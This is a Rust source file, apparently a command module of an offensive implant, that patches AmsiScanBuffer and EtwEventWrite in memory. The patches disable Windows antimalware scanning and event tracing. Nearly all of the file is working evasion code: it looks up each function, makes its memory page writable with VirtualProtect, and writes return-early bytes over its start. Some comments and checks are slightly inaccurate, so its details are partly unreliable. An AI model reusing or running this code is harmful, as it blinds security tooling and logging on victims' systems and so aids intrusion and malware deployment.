// AMSI/ETW bypass (Windows only).
//
// Patches in-memory function prologues so that:
//   - amsi.dll!AmsiScanBuffer returns AMSI_RESULT_CLEAN (E_INVALIDARG)
//   - ntdll!EtwEventWrite returns 0 without logging the event
//
// Uses GetModuleHandleA/GetProcAddress and VirtualProtect to make the
// target pages writable for the duration of the patch.

#[cfg(target_os = "windows")]
pub fn amsi_etw_cmd(_parameters: &str) -> String {
    let mut results = Vec::new();
    results.push(patch_amsi());
    results.push(patch_etw());
    results.join("\n")
}

#[cfg(not(target_os = "windows"))]
pub fn amsi_etw_cmd(_parameters: &str) -> String {
    "[-] amsi_etw only available on Windows".to_string()
}

#[cfg(target_os = "windows")]
fn patch_amsi() -> String {
    use windows::core::PCSTR;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};

    unsafe {
        let module = match GetModuleHandleA(PCSTR(b"amsi.dll\0".as_ptr())) {
            Ok(h) => h,
            Err(_) => return "[-] amsi.dll not loaded (nothing scanned yet)".to_string(),
        };
        let proc = match GetProcAddress(module, PCSTR(b"AmsiScanBuffer\0".as_ptr())) {
            Some(p) => p,
            None => return "[-] AmsiScanBuffer not found".to_string(),
        };
        let addr = proc as *mut u8;
        // mov eax, 0x80070057 (E_INVALIDARG); ret  -> AmsiScanBuffer fails "clean"
        let patch: [u8; 8] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00];
        write_patch(addr, &patch, PAGE_READWRITE, &mut PAGE_PROTECTION_FLAGS(0));
        match read_bytes(addr, 6) {
            Some(b) if b[..5] == patch[..5] => {
                "[+] AmsiScanBuffer patched (returns AMSI_RESULT_CLEAN)".to_string()
            }
            _ => "[-] AmsiScanBuffer patch verification failed".to_string(),
        }
    }
}

#[cfg(target_os = "windows")]
fn patch_etw() -> String {
    use windows::core::PCSTR;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};

    unsafe {
        let module = match GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())) {
            Ok(h) => h,
            Err(_) => return "[-] ntdll.dll not found".to_string(),
        };
        let proc = match GetProcAddress(module, PCSTR(b"EtwEventWrite\0".as_ptr())) {
            Some(p) => p,
            None => return "[-] EtwEventWrite not found".to_string(),
        };
        let addr = proc as *mut u8;
        // xor eax, eax; ret  -> EtwEventWrite returns STATUS_SUCCESS without logging
        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
        write_patch(addr, &patch, PAGE_READWRITE, &mut PAGE_PROTECTION_FLAGS(0));
        match read_bytes(addr, 3) {
            Some(b) if b == patch => {
                "[+] EtwEventWrite patched (events are no longer logged)".to_string()
            }
            _ => "[-] EtwEventWrite patch verification failed".to_string(),
        }
    }
}

#[cfg(target_os = "windows")]
unsafe fn write_patch(
    addr: *mut u8,
    patch: &[u8],
    protection: PAGE_PROTECTION_FLAGS,
    old: &mut PAGE_PROTECTION_FLAGS,
) -> bool {
    use windows::Win32::System::Memory::VirtualProtect;

    if VirtualProtect(addr.cast(), patch.len(), protection, old).is_err() {
        return false;
    }
    std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
    let _ = VirtualProtect(addr.cast(), patch.len(), *old, old);
    true
}

#[cfg(target_os = "windows")]
unsafe fn read_bytes(addr: *const u8, len: usize) -> Option<Vec<u8>> {
    let slice = std::slice::from_raw_parts(addr, len);
    Some(slice.to_vec())
}
